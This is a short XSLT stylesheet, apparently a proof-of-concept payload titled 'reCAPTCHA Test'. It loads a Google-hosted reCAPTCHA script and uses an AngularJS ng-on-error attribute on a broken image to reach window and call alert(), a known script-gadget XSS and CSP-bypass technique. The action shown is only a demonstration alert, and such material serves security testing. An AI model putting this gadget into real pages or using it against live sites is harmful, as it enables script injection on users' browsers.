<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
    <xsl:output method="html"/>

    <xsl:template match="/">
        <html>
        <head>
            <title>reCAPTCHA Test</title>
            <script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
        </head>
        <body>
		<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert()"/>
        </body>
        </html>
    </xsl:template>
</xsl:stylesheet>
